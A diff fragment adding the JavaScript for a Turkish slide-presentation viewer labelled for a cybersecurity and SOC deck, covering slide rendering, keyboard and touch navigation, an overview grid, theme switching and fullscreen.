+                }
+            });
+
+            if (inList) html += '</ul>';
+            return html;
+        }
+
+        function renderSlide(index) {
+            if (index < 0 || index >= slides.length) return;
+            currentIndex = index;
+            const slide = slides[currentIndex];
+
+            slideCard.style.animation = 'none';
+            slideCard.offsetHeight;
+            slideCard.style.animation = 'slideIn 0.35s cubic-bezier(0.16, 1, 0.3, 1)';
+
+            slideTitle.textContent = slide.baslik || 'Başlıksız Slayt';
+            slideSubtitle.textContent = slide.altbaslik || '';
+            
+            let bodyHTML = formatContent(slide.icerik);
+            if (slide.gorsel && slide.gorsel.query) {
+                bodyHTML += `<div class="visual-box">🖼️ <strong>Görsel Analoji & Tematik Kavram:</strong> ${slide.gorsel.query}</div>`;
+            }
+            slideBody.innerHTML = bodyHTML;
+
+            slideMeta.textContent = `SLAYT ${currentIndex + 1} / ${slides.length} • Siber Güvenlik & SOC`;
+            slideCounter.textContent = `${currentIndex + 1} / ${slides.length}`;
+            
+            const pct = ((currentIndex + 1) / slides.length) * 100;
+            progressBar.style.width = `${pct}%`;
+
+            prevBtn.disabled = currentIndex === 0;
+            nextBtn.disabled = currentIndex === slides.length - 1;
+
+            updateOverviewActive();
+        }
+
+        function buildOverviewGrid() {
+            gridOverview.innerHTML = '';
+            slides.forEach((slide, idx) => {
+                const card = document.createElement('div');
+                card.className = `thumb-card ${idx === currentIndex ? 'active' : ''}`;
+                card.innerHTML = `
+                    <div class="thumb-num">Slayt ${idx + 1}</div>
+                    <div class="thumb-title">${slide.baslik || 'Başlıksız'}</div>
+                `;
+                card.onclick = () => {
+                    renderSlide(idx);
+                    overviewModal.classList.remove('active');
+                };
+                gridOverview.appendChild(card);
+            });
+        }
+
+        function updateOverviewActive() {
+            const cards = gridOverview.querySelectorAll('.thumb-card');
+            cards.forEach((c, idx) => {
+                if (idx === currentIndex) c.classList.add('active');
+                else c.classList.remove('active');
+            });
+        }
+
+        prevBtn.onclick = () => renderSlide(currentIndex - 1);
+        nextBtn.onclick = () => renderSlide(currentIndex + 1);
+
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'ArrowRight' || e.key === 'Space' || e.key === 'PageDown') {
+                e.preventDefault();
+                renderSlide(currentIndex + 1);
+            } else if (e.key === 'ArrowLeft' || e.key === 'PageUp') {
+                e.preventDefault();
+                renderSlide(currentIndex - 1);
+            } else if (e.key === 'Home') {
+                e.preventDefault();
+                renderSlide(0);
+            } else if (e.key === 'End') {
+                e.preventDefault();
+                renderSlide(slides.length - 1);
+            } else if (e.key === 'f' || e.key === 'F') {
+                toggleFullscreen();
+            } else if (e.key === 'm' || e.key === 'M' || e.key === 'o' || e.key === 'O') {
+                toggleOverview();
+            } else if (e.key === 't' || e.key === 'T') {
+                toggleTheme();
+            }
+        });
+
+        function toggleOverview() {
+            buildOverviewGrid();
+            overviewModal.classList.toggle('active');
+        }
+
+        function toggleTheme() {
+            const current = document.documentElement.getAttribute('data-theme');
+            const next = current === 'dark' ? 'light' : 'dark';
+            document.documentElement.setAttribute('data-theme', next);
+            themeToggle.textContent = next === 'dark' ? '☀️' : '🌙';
+        }
+
+        function toggleFullscreen() {
+            if (!document.fullscreenElement) {
+                document.documentElement.requestFullscreen().catch(() => {});
+            } else {
+                document.exitFullscreen().catch(() => {});
+            }
+        }
+
+        overviewToggle.onclick = toggleOverview;
+        closeModal.onclick = () => overviewModal.classList.remove('active');
+        themeToggle.onclick = toggleTheme;
+        fullscreenToggle.onclick = toggleFullscreen;
+
+        let touchStartX = 0;
+        document.addEventListener('touchstart', e => touchStartX = e.changedTouches[0].screenX);
+        document.addEventListener('touchend', e => {
+            let touchEndX = e.changedTouches[0].screenX;
+            if (touchStartX - touchEndX > 50) renderSlide(currentIndex + 1);
+            if (touchEndX - touchStartX > 50) renderSlide(currentIndex - 1);
+        });
+
+        renderSlide(0);
+        buildOverviewGrid();
+    </script>
+</body>
+</html>
